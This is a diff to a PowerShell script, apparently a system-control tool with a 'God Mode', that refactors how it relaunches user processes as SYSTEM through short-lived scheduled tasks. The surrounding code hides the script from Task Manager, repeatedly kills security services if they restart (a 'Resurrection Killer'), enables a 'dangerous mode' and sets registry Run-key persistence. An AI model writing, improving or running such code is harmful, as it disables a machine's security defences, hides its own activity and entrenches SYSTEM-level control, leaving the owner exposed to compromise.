@@ -2232,16 +2232,16 @@ function Elevate-Process {
 
     try {
         $action = New-ScheduledTaskAction -Execute $Path -Argument $Arguments
-        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
+        $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" `
             -LogonType ServiceAccount -RunLevel Highest
         $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)
 
         Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
         Start-ScheduledTask -TaskName $tempTask
 
-        # Wait up to 3 seconds for the task to actually start running
+        # Wait up to 1 second for the task to actually start running
         $started = $false
-        for ($i = 0; $i -lt 30; $i++) {
+        for ($i = 0; $i -lt 10; $i++) {
             Start-Sleep -Milliseconds 100
             $taskInfo = Get-ScheduledTask -TaskName $tempTask -ErrorAction SilentlyContinue
             if ($taskInfo -and $taskInfo.State -eq "Running") {
@@ -2250,44 +2250,35 @@ function Elevate-Process {
             }
         }
 
-        # Give the process a moment to initialize before we clean up the task definition
-        if ($started) {
-            Start-Sleep -Seconds 1
-        } else {
-            # Task didn't report as Running; wait a bit more before cleanup
-            Start-Sleep -Seconds 2
-        }
-
+        Start-Sleep -Milliseconds 200
         Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false -ErrorAction SilentlyContinue
     } catch {
         Write-Log -Message "Failed to elevate: $Path" -Type "ERROR" -Color Red
     }
 }
 
-function Start-Monitoring {
-    Write-DebugLog -FunctionName "Start-Monitoring" -Action "ENTRY"
-    $Flag = Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
-    if (-not ($Flag -and $Flag.$GodModeFlagRegName -eq 1)) {
-        Write-Log -Message "God Mode is not enabled." -Type "ERROR" -Color Red
-        Write-DebugLog -FunctionName "Start-Monitoring" -Action "EXIT" -Message "Aborted: flag registry missing"
-        return
-    }
+function Test-SystemProcessExists {
+    param([string]$ProcessName)
+    try {
+        $procs = Get-WmiObject Win32_Process -Filter "Name='$ProcessName'" -ErrorAction SilentlyContinue
+        foreach ($p in $procs) {
+            try {
+                $owner = $p.GetOwner()
+                if ($owner.User -eq "SYSTEM") { return $true }
+            } catch { }
+        }
+    } catch { }
+    return $false
+}
 
-    # Hide from simple Task Manager view
-    Invoke-StealthMode
-
-    Write-Log -Message "Monitoring started with auto-recovery and resurrection killer." -Type "INFO"
-
-    $lastElevated = @{}   # Process path -> last elevated time
-    $lastKillCheck = [datetime]::MinValue
-    $lastExistingElevate = [datetime]::MinValue
-
-    # --- One-time elevation of all existing user-session processes at startup ---
+function Invoke-ExistingProcessElevation {
     Write-Log -Message "Elevating existing user-session processes to SYSTEM..." -Type "INFO" -Color Gray
     $CriticalProcs = @("csrss.exe", "lsass.exe", "services.exe", "smss.exe", "winlogon.exe", "wininit.exe", "svchost.exe", "taskhostw.exe", "sihost.exe", "dwm.exe", "fontdrvhost.exe", "Memory Compression", "Registry", "System", "Secure System", "powershell.exe", "pwsh.exe", "cmd.exe", "conhost.exe")
-    $DoNotKillProcs = @("explorer.exe", "taskmgr.exe")
     $ExistingProcesses = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -gt 0 -and $_.ExecutablePath -and $_.ExecutablePath -like "*.exe" }
+    $total = ($ExistingProcesses | Measure-Object).Count
+    $count = 0
     foreach ($proc in $ExistingProcesses) {
+        $count++
         $procName = [System.IO.Path]::GetFileName($proc.ExecutablePath)
         if ($CriticalProcs -contains $procName) { continue }
         $path = $proc.ExecutablePath
@@ -2306,19 +2297,45 @@ function Start-Monitoring {
                 }
             }
         }
-        if (-not $lastElevated.ContainsKey($path) -or $lastElevated[$path] -lt (Get-Date).AddSeconds(-60)) {
-            $lastElevated[$path] = Get-Date
-            Elevate-Process -Path $path -Arguments $arguments
-            Start-Sleep -Seconds 1
-            if ($DoNotKillProcs -notcontains $procName) {
-                try { Stop-Process -Id $proc.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
-            }
-        }
+        Elevate-Process -Path $path -Arguments $arguments
     }
+    Write-Log -Message "Existing process elevation complete." -Type "INFO" -Color Gray
+}
+
+function Start-Monitoring {
+    Write-DebugLog -FunctionName "Start-Monitoring" -Action "ENTRY"
+    $Flag = Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
+    if (-not ($Flag -and $Flag.$GodModeFlagRegName -eq 1)) {
+        Write-Log -Message "God Mode is not enabled." -Type "ERROR" -Color Red
+        Write-DebugLog -FunctionName "Start-Monitoring" -Action "EXIT" -Message "Aborted: flag registry missing"
+        return
+    }
+
+    # Hide from simple Task Manager view
+    Invoke-StealthMode
+
+    Write-Log -Message "Monitoring started with auto-recovery and resurrection killer." -Type "INFO"
+
+    $lastElevated = @{}   # Process path -> last elevated time (for startup/periodic scans)
+    $lastElevatedPid = @{} # Process ID -> elevated time (for new process detection)
+    $lastKillCheck = [datetime]::MinValue
+    $lastExistingElevate = [datetime]::MinValue
+    $lastPidCleanup = [datetime]::MinValue
+
+    # --- One-time elevation of all existing user-session processes at startup ---
+    Invoke-ExistingProcessElevation
 
     while ($true) {
         try {
             Start-Sleep -Seconds 2
+
+            # --- Cleanup old PID entries to prevent memory growth ---
+            if ((Get-Date) - $lastPidCleanup -gt [TimeSpan]::FromMinutes(5)) {
+                $lastPidCleanup = Get-Date
+                $now = Get-Date
+                $oldPids = $lastElevatedPid.GetEnumerator() | Where-Object { $_.Value -lt $now.AddMinutes(-10) } | Select-Object -ExpandProperty Key
+                foreach ($pid in $oldPids) { $lastElevatedPid.Remove($pid) | Out-Null }
+            }
 
             # --- Resurrection Killer: Re-kill security services if they respawn (every 30 seconds) ---
             if ((Get-Date) - $lastKillCheck -gt [TimeSpan]::FromSeconds(30)) {
@@ -2366,14 +2383,10 @@ function Start-Monitoring {
                             }
                         }
                     }
-                if (-not $lastElevated.ContainsKey($path) -or $lastElevated[$path] -lt (Get-Date).AddSeconds(-60)) {
+                if ((-not $lastElevated.ContainsKey($path) -or $lastElevated[$path] -lt (Get-Date).AddSeconds(-60)) -and -not (Test-SystemProcessExists -ProcessName $procName)) {
                         $lastElevated[$path] = Get-Date
                         Elevate-Process -Path $path -Arguments $arguments
-                        Start-Sleep -Seconds 1
-                        $procName = [System.IO.Path]::GetFileName($path)
-                        if ($DoNotKillProcs -notcontains $procName) {
-                            try { Stop-Process -Id $proc.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
-                        }
+                        Start-Sleep -Milliseconds 100
                     }
                 }
             }
@@ -2409,17 +2422,10 @@ function Start-Monitoring {
                         }
                     }
 
-                    # Stronger duplicate prevention (60-second cooldown)
-                    if (-not $lastElevated.ContainsKey($path) -or 
-                        $lastElevated[$path] -lt (Get-Date).AddSeconds(-60)) {
-
-                        $lastElevated[$path] = Get-Date
+                    # PID-based tracking: each process instance gets elevated once
+                    if (-not $lastElevatedPid.ContainsKey($proc.ProcessId)) {
+                        $lastElevatedPid[$proc.ProcessId] = Get-Date
                         Elevate-Process -Path $path -Arguments $arguments
-                        Start-Sleep -Seconds 1
-                        $procName = [System.IO.Path]::GetFileName($path)
-                        if ($DoNotKillProcs -notcontains $procName) {
-                            try { Stop-Process -Id $proc.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
-                        }
                     }
                 }
             }
@@ -2463,6 +2469,7 @@ function Enable-GodMode {
     Set-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -Value 1 -Force -ErrorAction SilentlyContinue
     Register-StealthTask
     Enable-DangerousMode
+    Invoke-ExistingProcessElevation
 
     # --- Registry Persistence (Run keys) ---
     Write-Log -Message "Setting registry persistence keys..." -Type "INFO" -Color Gray
